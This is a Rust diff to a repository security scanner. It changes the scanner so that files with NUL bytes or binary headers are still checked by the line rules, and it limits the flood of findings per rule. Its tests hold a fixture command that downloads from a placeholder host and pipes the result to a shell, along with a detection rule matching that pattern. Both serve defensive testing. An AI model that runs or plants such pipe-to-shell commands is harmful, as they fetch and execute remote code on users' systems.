@@ -5,7 +5,7 @@ use std::fs;
 use std::path::{Component, Path, PathBuf};
 
 use crate::checks::{FileCheck, FileCtx, FileIssue, RepoIndex};
-use crate::finding::Finding;
+use crate::finding::{Finding, Severity};
 use crate::rule::{Matcher, Rule};
 use crate::sanitize::{display_safe, to_slash};
 use crate::walk::{self, Limits, SkipReason, Skipped};
@@ -24,9 +24,23 @@ const SCRIPT_EXTENSIONS: &[&str] = &[
     "rb", "pl", "pm", "php", "ps1", "psm1", "psd1", "bat", "cmd", "vbs", "wsf", "lua",
 ];
 
+/// A file with NUL bytes that is not a script is read by the line rules only
+/// if at most one byte in this many is NUL. Text with a stray NUL has a
+/// handful of them; padding in a data format, or ASCII text in UTF-16 without a
+/// byte order mark (one byte in two), has far more. One in eight is above any
+/// accidental NUL in text and well below the density of such data.
+const MAX_NUL_RATIO: u64 = 8;
+
 /// One file check may list at most this many findings for one file; the rest
 /// are summarized on the last one, so a hostile file cannot flood the report.
 const MAX_FINDINGS_PER_FILE_CHECK: usize = 100;
+
+/// A line rule lists at most this many findings per file; the rest are only
+/// counted (`Report::unlisted`), so a hostile file cannot flood the report.
+const MAX_LINE_FINDINGS_PER_RULE: usize = 100;
+
+/// Added to findings from a file that has NUL bytes and does not read as text.
+const BINARY_LOOKING_NOTE: &str = " (found in a binary-looking file)";
 
 /// Everything one scan produced. Front ends decide how to show it.
 #[derive(Debug, Default)]
@@ -36,12 +50,27 @@ pub struct Report {
     /// Number of files that were read and analysed: text files, and binary
     /// files that a file-level rule examined.
     pub files_scanned: usize,
+    /// Findings a line rule produced beyond the per-file limit, which are not
+    /// in `findings`.
+    pub unlisted: Vec<Unlisted>,
     /// Files that were not (fully) analysed, with the reason. Nothing is left
     /// out silently: binary, oversized, symlinked and unreadable files are all
     /// listed here.
     pub skipped: Vec<Skipped>,
     /// True if the file-count limit cut the scan short.
     pub truncated: bool,
+}
+
+/// Findings of one rule in one file that were counted but not listed.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct Unlisted {
+    pub file: PathBuf,
+    pub rule_id: String,
+    /// The level of the rule: every finding of one rule has the same level, and
+    /// the limit applies per rule, so a flood of LOW findings from one rule can
+    /// never push a CRITICAL one from another rule out of the list.
+    pub severity: Severity,
+    pub count: usize,
 }
 
 impl Report {
@@ -133,6 +162,7 @@ pub fn scan(root: &Path, rules: &[Rule], limits: Limits) -> Report {
         let script = is_script(&slash_path, &bytes);
         let nul_line = script.then(|| first_nul_line(&bytes)).flatten();
         let mut utf16_text = None;
+        let mut binary_looking = false;
 
         if looks_binary(&bytes) {
             // An executable is listed even when a file rule looked at it, and
@@ -155,30 +185,48 @@ pub fn scan(root: &Path, rules: &[Rule], limits: Limits) -> Report {
                     // Windows PowerShell and WSH read UTF-16 scripts.
                     utf16_text = Some(decode_utf16_bom(&bytes));
                 } else if known_binary_magic(&bytes) {
-                    if checked.examined {
-                        report.files_scanned += 1;
-                    } else {
-                        skipped.push(Skipped {
-                            path: relative.clone(),
-                            reason: SkipReason::Binary,
-                        });
-                    }
-                    continue;
+                    binary_looking = true;
                 }
             }
-            // Anything else with a NUL byte and no known binary header goes
-            // to the line rules with the NULs removed: `dash` drops them, so
-            // a file sourced by a script can hide behind one.
+        }
+        // Any other file with a NUL byte that does not read as text, and any
+        // file with a known binary header, may still be sourced by a shell:
+        // `dash` drops the NULs and runs the rest, whatever else is in the
+        // file (`GIF89a=1` is a valid assignment). So it goes to the line
+        // rules too, but only as ASCII (see `ascii_only_text`), because on
+        // data such as icons and audio a rule that looks for a non-ASCII
+        // character matches by chance. It is listed, so the report shows
+        // that its binary contents were not looked at.
+        if !script && utf16_text.is_none() && bytes.contains(&0) && !nul_file_is_text(&bytes) {
+            binary_looking = true;
+        }
+        if binary_looking {
+            skipped.push(Skipped {
+                path: relative.clone(),
+                reason: SkipReason::Binary,
+            });
         }
 
         report.files_scanned += 1;
         let text = match utf16_text {
             Some(text) => text,
-            None => String::from_utf8_lossy(&bytes).replace('\0', ""),
+            None if binary_looking => ascii_only_text(&bytes),
+            None => text_without_nuls(&bytes),
         };
-        report
-            .findings
-            .extend(scan_text(relative, &slash_path, &text, nul_line, rules));
+        let mut found = scan_text(
+            relative,
+            &slash_path,
+            &text,
+            nul_line,
+            rules,
+            &mut report.unlisted,
+        );
+        if binary_looking {
+            for finding in &mut found {
+                finding.explanation.push_str(BINARY_LOOKING_NOTE);
+            }
+        }
+        report.findings.extend(found);
     }
 
     // Entries the walk did not hand over still matter to a rule that asks for
@@ -326,6 +374,7 @@ fn scan_text(
     text: &str,
     nul_line: Option<usize>,
     rules: &[Rule],
+    unlisted: &mut Vec<Unlisted>,
 ) -> Vec<Finding> {
     let applicable: Vec<&Rule> = rules
         .iter()
@@ -339,8 +388,15 @@ fn scan_text(
     for rule in applicable {
         match &rule.matcher {
             Matcher::LineRegex(pattern) => {
+                let mut listed = 0;
+                let mut hidden = 0;
                 for (index, line) in text.lines().enumerate() {
                     if pattern.is_match(line) {
+                        if listed == MAX_LINE_FINDINGS_PER_RULE {
+                            hidden += 1;
+                            continue;
+                        }
+                        listed += 1;
                         findings.push(Finding {
                             rule_id: rule.id.clone(),
                             severity: rule.severity,
@@ -351,6 +407,14 @@ fn scan_text(
                             explanation: rule.description.clone(),
                         });
                     }
+                }
+                if hidden > 0 {
+                    unlisted.push(Unlisted {
+                        file: relative.to_path_buf(),
+                        rule_id: rule.id.clone(),
+                        severity: rule.severity,
+                        count: hidden,
+                    });
                 }
             }
             Matcher::Jsonc(check) => {
@@ -426,9 +490,9 @@ fn decode_utf16_bom(bytes: &[u8]) -> String {
         .collect()
 }
 
-/// Headers of formats that are binary data by design and that no script
-/// engine reads as text: archives, compressed streams, images, documents,
-/// WebAssembly and fonts.
+/// Headers of formats that are binary data by design: archives, compressed
+/// streams, images, documents, WebAssembly and fonts. A file with one of them
+/// is still read as ASCII by the line rules (a shell may source it).
 fn known_binary_magic(bytes: &[u8]) -> bool {
     const MAGICS: [&[u8]; 17] = [
         &[0x1F, 0x8B],
@@ -450,6 +514,81 @@ fn known_binary_magic(bytes: &[u8]) -> bool {
         b"\0\x01\0\0",
     ];
     MAGICS.iter().any(|magic| bytes.starts_with(magic))
+}
+
+/// The file as `dash` and `bash` read it: the NUL bytes are dropped first and
+/// the rest is decoded, so a multi-byte character cut by a NUL is whole again.
+fn text_without_nuls(bytes: &[u8]) -> String {
+    if !bytes.contains(&0) {
+        return String::from_utf8_lossy(bytes).into_owned();
+    }
+    let kept: Vec<u8> = bytes.iter().copied().filter(|&b| b != 0).collect();
+    String::from_utf8_lossy(&kept).into_owned()
+}
+
+/// Like `text_without_nuls`, but every non-ASCII byte becomes U+FFFD, so a
+/// rule can only match ASCII. Used for NUL-bearing data that does not read as
+/// text: the code a shell would run is still there, and noise cannot spell a
+/// character by chance.
+fn ascii_only_text(bytes: &[u8]) -> String {
+    bytes
+        .iter()
+        .filter(|&&b| b != 0)
+        .map(|&b| {
+            if b.is_ascii() {
+                char::from(b)
+            } else {
+                char::REPLACEMENT_CHARACTER
+            }
+        })
+        .collect()
+}
+
+/// Whether a file that contains NUL bytes reads as text with a few stray ones:
+/// the NULs are at most one byte in `MAX_NUL_RATIO`, and the rest is valid
+/// UTF-8 once they are removed. Random data (compressed audio, icons) fails the
+/// second test almost at once.
+fn nul_file_is_text(bytes: &[u8]) -> bool {
+    let mut probe = NulProbe::default();
+    probe.feed(bytes);
+    probe.is_text()
+}
+
+/// The two measurements behind `nul_file_is_text`, taken over a stream of
+/// chunks so a large file never has to be in memory at once.
+#[derive(Default)]
+struct NulProbe {
+    total: u64,
+    nuls: u64,
+    /// The start of a multi-byte UTF-8 sequence cut off by the end of a chunk.
+    pending: Vec<u8>,
+    invalid: bool,
+}
+
+impl NulProbe {
+    fn feed(&mut self, chunk: &[u8]) {
+        self.total += chunk.len() as u64;
+        for (index, segment) in chunk.split(|&b| b == 0).enumerate() {
+            if index > 0 {
+                self.nuls += 1;
+            }
+            if self.invalid || segment.is_empty() {
+                continue;
+            }
+            self.pending.extend_from_slice(segment);
+            match std::str::from_utf8(&self.pending) {
+                Ok(_) => self.pending.clear(),
+                Err(err) if err.error_len().is_none() => {
+                    self.pending.drain(..err.valid_up_to());
+                }
+                Err(_) => self.invalid = true,
+            }
+        }
+    }
+
+    fn is_text(&self) -> bool {
+        !self.invalid && self.pending.is_empty() && self.nuls * MAX_NUL_RATIO <= self.total
+    }
 }
 
 /// The 1-based line of the first NUL byte, counting `\n` as shells do.
@@ -603,15 +742,20 @@ mod tests {
     }
 
     #[test]
-    fn binary_files_are_not_line_scanned_but_are_reported_as_skipped() {
+    fn binary_files_are_line_scanned_as_ascii_and_listed() {
         let dir = tempfile::tempdir().unwrap();
         write(dir.path(), "blob.bin", b"\x1f\x8b\0\0TODO");
         let rules = parse_rules(RULES, "test.toml").unwrap();
 
         let report = scan(dir.path(), &rules, Limits::default());
 
-        assert_eq!(report.files_scanned, 0);
-        assert!(report.findings.is_empty());
+        assert_eq!(report.files_scanned, 1);
+        assert_eq!(report.findings.len(), 1);
+        assert!(
+            report.findings[0]
+                .explanation
+                .ends_with("(found in a binary-looking file)")
+        );
         assert_eq!(
             report.skipped,
             [Skipped {
@@ -798,9 +942,9 @@ mod tests {
         assert_eq!(found.len(), 1);
         assert_eq!(found[0].0, "x.pth");
         assert!(found[0].1.contains("bytes=22 issue=None"), "{}", found[0].1);
-        // The file a rule examined counts as scanned and is not listed as a
-        // binary skip; the file nobody examined is listed.
-        assert_eq!(report.files_scanned, 1);
+        // The text file a rule examined is not listed; the binary one is
+        // read as ASCII by the line rules and listed.
+        assert_eq!(report.files_scanned, 2);
         assert_eq!(
             report.skipped,
             [Skipped {
@@ -1144,6 +1288,320 @@ mod tests {
             [(".envrc".to_string(), 2), ("lib/common".to_string(), 3)]
         );
         assert!(report.skipped.is_empty());
+    }
+
+    /// Bytes that are not valid UTF-8 (0xFF never is) around a sequence the
+    /// bidi rule would match, with a few NULs, like the middle of an icon or
+    /// an audio stream.
+    fn noise_with_bidi(header: &[u8]) -> Vec<u8> {
+        let mut bytes = header.to_vec();
+        for i in 0..400u32 {
+            bytes.push((i.wrapping_mul(37) % 251) as u8 | 0x80);
+        }
+        bytes.extend_from_slice(&[0xFF, 0xE2, 0x80, 0xAE, 0xFF]);
+        bytes.extend_from_slice(&[0x11; 200]);
+        bytes
+    }
+
+    #[test]
+    fn binary_data_without_a_known_header_gets_no_findings_from_non_ascii_rules() {
+        let dir = tempfile::tempdir().unwrap();
+        write(dir.path(), "icon.icns", &noise_with_bidi(b"icns\0\0\x10\0"));
+        write(
+            dir.path(),
+            "voice.mp3",
+            &noise_with_bidi(b"ID3\x03\0\0\0\0\x0a\0"),
+        );
+        let rules = builtin_rules().unwrap();
+
+        let report = scan(dir.path(), &rules, Limits::default());
+
+        assert!(report.findings.is_empty(), "{:?}", report.findings);
+        assert!(report.is_complete());
+    }
+
+    #[test]
+    fn a_script_is_read_even_when_the_rest_of_it_is_binary() {
+        // Scripts keep the rule that a NUL does not make them binary: the
+        // zipapp pattern (see the NUL rule) and the NUL itself are reported.
+        let dir = tempfile::tempdir().unwrap();
+        write(
+            dir.path(),
+            "tool.sh",
+            &noise_with_bidi(b"#!/bin/sh\n# a\0b\n"),
+        );
+        let rules = builtin_rules().unwrap();
+
+        let report = scan(dir.path(), &rules, Limits::default());
+
+        assert_eq!(
+            builtin_findings(&report, NUL_RULE),
+            [("tool.sh".to_string(), 2)]
+        );
+        assert!(report.skipped.is_empty());
+    }
+
+    const CURL_SH: &str = r#"
+        [[rule]]
+        id = "test.curl-sh"
+        engine = "line-regex"
+        family = "test"
+        stage = "run"
+        severity = "high"
+        description = "Pipes a download into a shell"
+        example = "lib/env:1"
+        pattern = 'curl .*\| *sh'
+    "#;
+
+    const PAYLOAD: &[u8] = b"curl https://example.invalid/x | sh\n";
+
+    fn payload_with(prefix: &[u8], suffix: &[u8]) -> Vec<u8> {
+        [prefix, PAYLOAD, suffix].concat()
+    }
+
+    /// Scans one extensionless file (a shell can `source` it) with the
+    /// builtin rules and the curl rule, and returns the report.
+    fn scan_sourced(contents: &[u8]) -> Report {
+        let dir = tempfile::tempdir().unwrap();
+        write(dir.path(), "lib/env", contents);
+        let mut rules = builtin_rules().unwrap();
+        rules.extend(parse_rules(CURL_SH, "test.toml").unwrap());
+        scan(dir.path(), &rules, Limits::default())
+    }
+
+    fn assert_payload_found_on_line(report: &Report, line: usize) {
+        let found: Vec<_> = report
+            .findings
+            .iter()
+            .filter(|f| f.rule_id == "test.curl-sh")
+            .collect();
+        assert_eq!(found.len(), 1, "{:?}", report.findings);
+        assert_eq!(found[0].line, line);
+        assert!(
+            report
+                .skipped
+                .iter()
+                .all(|s| s.reason == SkipReason::Binary)
+        );
+        assert!(report.is_complete());
+    }
+
+    #[test]
+    fn one_nul_and_one_invalid_byte_do_not_hide_a_sourced_payload() {
+        let report = scan_sourced(&payload_with(b"", b"# \0\xFF\n"));
+
+        assert_payload_found_on_line(&report, 1);
+        assert!(
+            report.findings[0]
+                .explanation
+                .ends_with("(found in a binary-looking file)"),
+            "{}",
+            report.findings[0].explanation
+        );
+    }
+
+    #[test]
+    fn a_nul_past_the_sniffed_prefix_does_not_hide_a_payload() {
+        let comments = "# a comment line\n".repeat(600);
+        assert!(comments.len() > BINARY_SNIFF_LEN);
+        let report = scan_sourced(&payload_with(comments.as_bytes(), b"# \0\xFF\n"));
+
+        assert_payload_found_on_line(&report, 601);
+    }
+
+    #[test]
+    fn nul_padding_after_a_payload_does_not_hide_it() {
+        let report = scan_sourced(&payload_with(b"", &[0; 4096]));
+
+        assert_payload_found_on_line(&report, 1);
+    }
+
+    #[test]
+    fn nul_between_every_byte_does_not_hide_a_payload() {
+        // ASCII in UTF-16 without a byte order mark: one NUL per byte.
+        let wide: Vec<u8> = PAYLOAD.iter().flat_map(|&b| [b, 0]).collect();
+        let report = scan_sourced(&wide);
+
+        assert_payload_found_on_line(&report, 1);
+    }
+
+    #[test]
+    fn a_latin_1_byte_with_a_nul_does_not_hide_a_payload() {
+        let report = scan_sourced(&payload_with(b"", b"# caf\xE9 \0\n"));
+
+        assert_payload_found_on_line(&report, 1);
+    }
+
+    #[test]
+    fn text_with_a_stray_nul_is_not_marked_binary_looking() {
+        let report = scan_sourced(&payload_with(b"# a stray \0 in plain text\n", b""));
+
+        assert_payload_found_on_line(&report, 2);
+        assert!(!report.findings[0].explanation.contains("binary-looking"));
+        assert!(report.skipped.is_empty());
+    }
+
+    #[test]
+    fn a_known_header_does_not_hide_a_sourced_payload() {
+        // `GIF89a=1` is a valid shell assignment; the rest of the file runs.
+        for header in [&b"GIF89a=1\n"[..], b"%PDF-1.4\n", b"PK\x03\x04\n"] {
+            let report = scan_sourced(&payload_with(header, b"\0\n"));
+
+            assert_payload_found_on_line(&report, 2);
+            assert!(
+                report.findings[0]
+                    .explanation
+                    .ends_with("(found in a binary-looking file)")
+            );
+            assert!(report.is_complete());
+        }
+    }
+
+    #[test]
+    fn real_binary_formats_give_no_findings() {
+        let dir = tempfile::tempdir().unwrap();
+        let formats: [(&str, &[u8]); 5] = [
+            ("a.png", b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR"),
+            ("b.zip", b"PK\x03\x04\x14\0\0\0\x08\0"),
+            ("c.gz", &[0x1F, 0x8B, 8, 0, 0, 0, 0, 0]),
+            ("d.icns", b"icns\0\0\x10\0"),
+            ("e.mp3", b"ID3\x03\0\0\0\0\x0a\0"),
+        ];
+        for (name, header) in formats {
+            write(dir.path(), name, &noise_with_bidi(header));
+        }
+        let mut rules = builtin_rules().unwrap();
+        rules.extend(parse_rules(CURL_SH, "test.toml").unwrap());
+
+        let report = scan(dir.path(), &rules, Limits::default());
+
+        assert!(report.findings.is_empty(), "{:?}", report.findings);
+        assert_eq!(report.skipped.len(), 5);
+        assert!(report.is_complete());
+    }
+
+    #[test]
+    fn a_flood_of_low_findings_cannot_hide_a_critical_one() {
+        const DECOY_AND_PAYLOAD: &str = r#"
+            [[rule]]
+            id = "test.decoy"
+            engine = "line-regex"
+            family = "test"
+            stage = "run"
+            severity = "low"
+            description = "Decoy"
+            example = "a:1"
+            pattern = 'DECOY'
+
+            [[rule]]
+            id = "test.payload"
+            engine = "line-regex"
+            family = "test"
+            stage = "run"
+            severity = "critical"
+            description = "Payload"
+            example = "a:1"
+            pattern = 'PAYLOAD'
+        "#;
+        let dir = tempfile::tempdir().unwrap();
+        let mut contents = "DECOY\n".repeat(150);
+        contents.push_str("PAYLOAD\n");
+        write(dir.path(), "x.txt", contents.as_bytes());
+        let rules = parse_rules(DECOY_AND_PAYLOAD, "test.toml").unwrap();
+
+        let report = scan(dir.path(), &rules, Limits::default());
+
+        let critical: Vec<_> = report
+            .findings
+            .iter()
+            .filter(|f| f.severity == Severity::Critical)
+            .map(|f| f.line)
+            .collect();
+        assert_eq!(critical, [151]);
+        assert_eq!(
+            report.unlisted,
+            [Unlisted {
+                file: PathBuf::from("x.txt"),
+                rule_id: "test.decoy".to_string(),
+                severity: Severity::Low,
+                count: 50,
+            }]
+        );
+    }
+
+    #[test]
+    fn a_character_cut_by_a_nul_is_whole_for_the_line_rules() {
+        let dir = tempfile::tempdir().unwrap();
+        write(
+            dir.path(),
+            "notes",
+            b"some notes x \xE2\0\x80\xAE y and more text\n",
+        );
+        let rules = builtin_rules().unwrap();
+
+        let report = scan(dir.path(), &rules, Limits::default());
+
+        assert_eq!(
+            builtin_findings(&report, "deception.bidi-control"),
+            [("notes".to_string(), 1)]
+        );
+    }
+
+    #[test]
+    fn a_line_rule_lists_a_limited_number_of_findings_per_file_and_counts_the_rest() {
+        let dir = tempfile::tempdir().unwrap();
+        write(dir.path(), "todo.txt", "TODO\n".repeat(130).as_bytes());
+        write(dir.path(), "few.txt", "TODO\n".repeat(3).as_bytes());
+        let rules = parse_rules(RULES, "test.toml").unwrap();
+
+        let report = scan(dir.path(), &rules, Limits::default());
+
+        let in_file = |name: &str| {
+            report
+                .findings
+                .iter()
+                .filter(|f| to_slash(&f.file) == name)
+                .count()
+        };
+        assert_eq!(in_file("todo.txt"), MAX_LINE_FINDINGS_PER_RULE);
+        assert_eq!(in_file("few.txt"), 3);
+        assert_eq!(
+            report.unlisted,
+            [Unlisted {
+                file: PathBuf::from("todo.txt"),
+                rule_id: "test.everywhere".to_string(),
+                severity: Severity::Low,
+                count: 30,
+            }]
+        );
+    }
+
+    #[test]
+    fn nul_ratio_and_utf8_checks() {
+        assert!(nul_file_is_text(b"a stray \0 in some text"));
+        assert!(nul_file_is_text("h\0\u{e9}llo \u{202e} world\n".as_bytes()));
+        // A multi-byte character split by a NUL is whole again once it is gone.
+        assert!(nul_file_is_text(
+            b"some text \xE2\0\x80\xAE here and there\0"
+        ));
+        assert!(!nul_file_is_text(b"some text \0 and \xFF"));
+        assert!(!nul_file_is_text(b"some text \0 and \xE2\x80"), "cut-off");
+        assert!(!nul_file_is_text(&[0; 64]));
+        // The limit is one NUL in eight bytes.
+        assert!(nul_file_is_text(b"abcdefg\0"));
+        assert!(!nul_file_is_text(b"abcdef\0\0"));
+
+        // Feeding in pieces gives the same answer as feeding all at once.
+        let data = "h\u{e9}\0llo \u{202e}\0 and more text \n".as_bytes();
+        for first in 0..data.len() {
+            for second in first..data.len() {
+                let mut probe = NulProbe::default();
+                probe.feed(&data[..first]);
+                probe.feed(&data[first..second]);
+                probe.feed(&data[second..]);
+                assert!(probe.is_text(), "cuts at {first} and {second}");
+            }
+        }
     }
 
     #[test]
